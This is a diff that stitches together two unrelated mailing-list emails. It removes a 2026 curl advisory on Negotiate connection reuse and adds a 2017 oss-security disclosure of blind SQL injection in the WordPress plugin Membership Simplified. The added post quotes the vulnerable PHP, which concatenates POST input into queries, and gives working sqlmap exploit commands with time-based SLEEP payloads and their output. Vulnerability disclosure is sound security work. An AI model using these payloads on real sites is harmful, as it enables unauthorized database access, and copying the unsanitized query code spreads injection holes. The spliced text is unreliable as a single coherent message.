@@ -1,4 +1,9 @@
-Received: (qmail 7893 invoked by uid 550); 11 Mar 2026 06:54:49 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["4827" "Wednesday" "22" "March" "2017" "06:59:33" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<BFF5A561-72DD-4395-B558-F4DDBB8AB751@me.com>" "109" "[oss-security] Multiple Unauthenticated blind SQL injections in Wordpress Plugin Membership Simplified v1.58" nil nil nil "3" "2017032210:59:33" "[oss-security] Multiple Unauthenticated blind SQL injections in Wordpress Plugin Membership Simplified v1.58" (number mark "U       larry0@me.co Mar 22  109/4827  " thread-indent "\"[oss-security] Multiple Unauthenticated blind SQL injections in Wordpress Plugin Membership Simplified v1.58\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 27836 invoked by uid 550); 22 Mar 2017 10:59:50 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,135 +12,139 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 7872 invoked from network); 11 Mar 2026 06:54:49 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=haxx.se; s=silly;
-	t=1773212078; bh=nPFHKLUQGgC0xPpEovcs2m4YY9Ho21HX2ZWrmBfvSZA=;
-	h=Date:From:To:Subject:From;
-	b=M9Smsd6Y9hpoc6vJcvWmNSZQh1/d8tT9llAZdSFogynN/swXBop8XHvA8psLtCQRk
-	 hfjRwUp1Dh1wraYwvldcX8oXsLsbjP+cMSF/yNp08Pk9UymC25HjQCFe7/exRu2YZE
-	 a3xCvw9jb1HvuCLzISXRUBN+neeTIqvbRwijTT8li0AJNQ1aNDxjyobQTkxHQquPRV
-	 YvGOV/qElLxwgmUc/h2a4fCoG3LI5TdMLE5BcLr45LiQgBRpBRir8z2ZQSS9cqcUPQ
-	 DADo9Af0fGzOUN00buESujvNgyMws74BsmvriQ1mwDFftBGVSc95GLjoSPRExADWyq
-	 r5+ceoABoly9g==
-Date: Wed, 11 Mar 2026 07:54:38 +0100 (CET)
-From: Daniel Stenberg <daniel@haxx.se>
-To: curl security announcements -- curl users <curl-users@lists.haxx.se>, 
-    curl-announce@lists.haxx.se, libcurl hacking <curl-library@lists.haxx.se>, 
-    oss-security@lists.openwall.com
-Message-ID: <4q225499-5soo-2310-4q77-p7rq4814p6n9@unkk.fr>
-X-fromdanielhimself: yes
-MIME-Version: 1.0
-Content-Type: text/plain; format=flowed; charset=US-ASCII
-Subject: [oss-security] [ADVISORY] curl: CVE-2026-1965: bad reuse of HTTP Negotiate
- connection
+Received: (qmail 27791 invoked from network); 22 Mar 2017 10:59:47 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
+	t=1490180375; bh=wuxJnqL+3UHUKesmuifuNopAMegiRM1vHDAi96XXXaM=;
+	h=From:Content-type:Subject:Message-id:Date:To:MIME-version;
+	b=EiNIkwQMYZKKrJhNI99GHYkyYEVkicqN+x3wXjiIVXvDoaO6sHBXJ3QOMwdDPaK9g
+ W0upyW50NjcwnsdDYV3kJ1Woc3QqhRgf0bgcMNdlHzMitFTmXv8+hjuaY3WK/IAsiG
+ 30jXQ98FNYyCVxDlWAU+b1IwfTbVQzX5RXfBQaM0fcJJVMXa1GZKPjaTewSPE+rlgK
+ U3h5ncSKrDtGOU+VRr2abnGtPOzsbRpP9hHmX6b8zwCaZ879Qr16ORB0HB9WpxS0zQ
+ g3tIwh3jKeE5yzS6VyI5FEGRGNv+URQygSIvGAuVmiTIOs2DaQrYjFy2wqPFeXKPkp
+ gcNZsPBgW1wvg==
+X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
+ definitions=2017-03-22_09:,, signatures=0
+X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
+ clxscore=1034 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
+ bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
+ engine=8.0.1-1701120000 definitions=main-1703220095
+From: "Larry W. Cashdollar" <larry0@me.com>
+Content-type: text/plain; charset=utf-8
+Content-transfer-encoding: quoted-printable
+Message-id: <BFF5A561-72DD-4395-B558-F4DDBB8AB751@me.com>
+Date: Wed, 22 Mar 2017 06:59:33 -0400
+To: Open Source Security <oss-security@lists.openwall.com>
+MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
+X-Mailer: Apple Mail (2.3124)
+Subject: [oss-security] Multiple Unauthenticated blind SQL injections in Wordpress Plugin
+ Membership Simplified v1.58
 
-bad reuse of HTTP Negotiate connection
-======================================
+Title: Multiple Unauthenticated blind SQL injections in Wordpress Plugin Me=
+mbership Simplified v1.58
+Author: Larry W. Cashdollar, @_larry0
+Date: 2017-03-17
+CVE-ID:[CVE-2017-1002009][CVE-2017-1002010]
+Download Site: http://membership.officeautopilot.com/get-it-now/
+Vendor: http://membership.officeautopilot.com/
+Vendor Notified: 2017-03-17
+Vendor Contact: http://membership.officeautopilot.com/1-58-has-been-release=
+d-and-works-with-version-4-5-of-wordpress/#comment-484
+Advisory: http://www.vapidlabs.com/advisory.php?v=3D188
+Description: Membership Simplified allows you to generate membership lesson=
+s with templated content to create a unified look and feel throughout your =
+courses.
+Vulnerability:
+The code in membership-simplified-for-oap-members-only/updateDB.php is vuln=
+erable to blind SQL injection because it doesn't sanitize user input via an=
+y of the POST requests being passed into the SQL query.  Also it doesn't ch=
+eck that a user is authorized to make updates to the database.
 
-Project curl Security Advisory, March 11th 2026
-[Permalink](https://curl.se/docs/CVE-2026-1965.html)
+  2 require_once("../../../wp-config.php");
+  3 global $wpdb;
+  4 $table_name =3D $wpdb->prefix . "download_listing";
+  5 $media_table_name =3D $wpdb->prefix . "media_listing";
+  6 $action =3D $_POST['action'];
+  7 $updateRecordsArray =3D $_POST['recordsArray'];
+  8 $mediaupdateRecordsArray =3D $_POST['mediaRecordsArray'];
 
-VULNERABILITY
--------------
+CVE-2017-1002009:
+I chose to test the SQL injection against the delete action as it was the m=
+ost straightforward injection point.
 
-libcurl can in some circumstances reuse the wrong connection when asked to do
-an Negotiate-authenticated HTTP or HTTPS request.
+ 34 if($action =3D=3D 'delete') {
+ 35         $upload_base_dir =3D wp_upload_dir();
+ 36         $upload_dir =3D  $upload_base_dir['basedir'];
+ 37         $path=3D $upload_dir.'/membership-simplified-for-oap-members-on=
+ly/';
+ 38         $fileName =3D $wpdb->get_row("select fileName from $table_name =
+where recordId=3D ".$_POST['recordId']."");
+ 39         @unlink($path.$fileName->fileName);
+ 40         $query=3D "delete from $table_name where recordId=3D '".$_POST[=
+'recordId']."' ";
+ 41         $wpdb->query($query) or die('Error, insert query failed');
+ 42=20
+ 43 }
 
-libcurl features a pool of recent connections so that subsequent requests can
-reuse an existing connection to avoid overhead.
+CVE-2017-1002010:
 
-When reusing a connection a range of criterion must first be met. Due to a
-logical error in the code, a request that was issued by an application could
-wrongfully reuse an existing connection to the same server that was
-authenticated using different credentials. One underlying reason being that
-Negotiate sometimes authenticates *connections* and not *requests*, contrary
-to how HTTP is designed to work.
+ 56 if($action =3D=3D 'delete_media') {
+ 57         $upload_base_dir =3D wp_upload_dir();
+ 58         $upload_dir =3D $upload_base_dir['basedir'];
+ 59         $path =3D $upload_dir.'/membership-simplified-for-oap-members-o=
+nly/';
+ 60         $fileName =3D $wpdb->get_row("select fileName from $media_table=
+_name where recordId=3D ".$_POST['recordId']."");
+ 61         //@unlink($path.$fileName->fileName);
+ 62         $query=3D "delete from $media_table_name where recordId=3D '".$=
+_POST['recordID']."' ";
+ 65         $wpdb->query($query) or die($query);
 
-An application that allows Negotiate authentication to a server (that responds
-wanting Negotiate) with `user1:password1` and then does another operation to
-the same server also using Negotiate but with `user2:password2` (while the
-previous connection is still alive) - the second request wrongly reused the
-same connection and since it then sees that the Negotiate negotiation is
-already made, it just sends the request over that connection thinking it uses
-the user2 credentials when it is in fact still using the connection
-authenticated for user1...
-
-The set of authentication methods to use is set with `CURLOPT_HTTPAUTH`.
-
-Applications can disable libcurl's reuse of connections and thus mitigate this
-problem, by using one of the following libcurl options to alter how
-connections are or are not reused: `CURLOPT_FRESH_CONNECT`,
-`CURLOPT_MAXCONNECTS` and `CURLMOPT_MAX_HOST_CONNECTIONS` (if using the
-curl_multi API).
-
-INFO
-----
-
-The Common Vulnerabilities and Exposures (CVE) project has assigned the name
-CVE-2026-1965 to this issue.
-
-This flaw is similar to [CVE-2014-0015](CVE-2014-0015.md), but that flaw was
-for NTLM.
-
-CWE-305: Authentication Bypass by Primary Weakness
-
-Severity: Medium
-
-AFFECTED VERSIONS
------------------
-
-This flaw has existed since curl started to support Negotiate.
-
-- Affected versions: from curl 7.10.6 to and including 8.18.0
-- Not affected versions: curl < 7.10.6 and >= 8.19.0
-- Introduced-in: https://github.com/curl/curl/commit/e56ae1426c
-
-libcurl is used by many applications, but not always advertised as such!
-
-This bug is not considered a *C mistake*. It is not likely to have been
-avoided had we not been using C.
-
-This flaw **also** affects the curl command line tool.
-
-SOLUTION
---------
-
-curl 8.19.0 makes sure that connections that may use Negotiate cannot reuse
-another Negotiate-using connection unless the credentials match.
-
-- Fixed-in: https://github.com/curl/curl/commit/34fa034d9a390c4bd6
-- Fixed-in: https://github.com/curl/curl/commit/f1a39f221d57354990
-
-RECOMMENDATIONS
----------------
-
-We suggest you take one of the following actions immediately, in order of
-preference:
-
-  A - Upgrade to curl and libcurl 8.19.0
-
-  B - Apply the patch and rebuild libcurl
-
-  C - Avoid using HTTP Negotiate in your application
-
-TIMELINE
----------
-
-It was reported to the curl project on February 4th 2026. We contacted
-distros@openwall on March 8.
-
-libcurl 8.19.0 was released on March 11th 2026, coordinated with the
-publication of this advisory.
-
-CREDITS
--------
-
-- Reported-by: Zhicheng Chen
-- Patched-by: Daniel Stenberg
-
-Thanks a lot!
-
--- 
-
-  / daniel.haxx.se || https://rock-solid.curl.dev
+Exploit Code:
+	=E2=80=A2 $ sqlmap -u 'http://example.com/wordpress/wp-content/plugins/mem=
+bership-simplified-for-oap-members-only/updateDB.php' --data 'action=3Ddele=
+te&recordId=3D*' --dbms mysql  --level 3 --risk 3
+	=E2=80=A2=20=20
+	=E2=80=A2 (custom) POST parameter '#1*' is vulnerable. Do you want to keep=
+ testing the others (if any)? [y/N]=20
+	=E2=80=A2 sqlmap identified the following injection point(s) with a total =
+of 1411 HTTP(s) requests:
+	=E2=80=A2 ---
+	=E2=80=A2 Parameter: #1* ((custom) POST)
+	=E2=80=A2     Type: AND/OR time-based blind
+	=E2=80=A2     Title: MySQL >=3D 5.0.12 time-based blind - Parameter replac=
+e (substraction)
+	=E2=80=A2     Payload: action=3Ddelete&recordId=3D(SELECT * FROM (SELECT(S=
+LEEP(5)))uxVZ)
+	=E2=80=A2 ---
+	=E2=80=A2 [02:10:51] [INFO] the back-end DBMS is MySQL
+	=E2=80=A2 web server operating system: Linux Ubuntu 16.04 (xenial)
+	=E2=80=A2 web application technology: Apache 2.4.18
+	=E2=80=A2 back-end DBMS: MySQL >=3D 5.0.12
+	=E2=80=A2 [02:10:51] [INFO] fetched data logged to text files under '/home=
+/larry/.sqlmap/output/example.com'
+	=E2=80=A2=20=20
+	=E2=80=A2 [*] shutting down at 02:10:51
+	=E2=80=A2=20=20
+	=E2=80=A2=20=20
+	=E2=80=A2 $ sqlmap -u 'http://example.com/wordpress/wp-content/plugins/mem=
+bership-simplified-for-oap-members-only/updateDB.php' --data 'action=3Ddele=
+te_media&recordId=3D*' --dbms mysql  --level 3 --risk 3
+	=E2=80=A2=20=20
+	=E2=80=A2 sqlmap identified the following injection point(s) with a total =
+of 1411 HTTP(s) requests:
+	=E2=80=A2 ---
+	=E2=80=A2 Parameter: #1* ((custom) POST)
+	=E2=80=A2     Type: AND/OR time-based blind
+	=E2=80=A2     Title: MySQL >=3D 5.0.12 time-based blind - Parameter replac=
+e (substraction)
+	=E2=80=A2     Payload: action=3Ddelete_media&recordId=3D(SELECT * FROM (SE=
+LECT(SLEEP(5)))ENgw)
+	=E2=80=A2 ---
+	=E2=80=A2 [02:34:49] [INFO] the back-end DBMS is MySQL
+	=E2=80=A2 web server operating system: Linux Ubuntu 16.04 (xenial)
+	=E2=80=A2 web application technology: Apache 2.4.18
+	=E2=80=A2 back-end DBMS: MySQL >=3D 5.0.12
+	=E2=80=A2 [02:34:49] [INFO] fetched data logged to text files under '/home=
+/larry/.sqlmap/output/example.com'
+	=E2=80=A2=20=20
+	=E2=80=A2 [*] shutting down at 02:34:49=
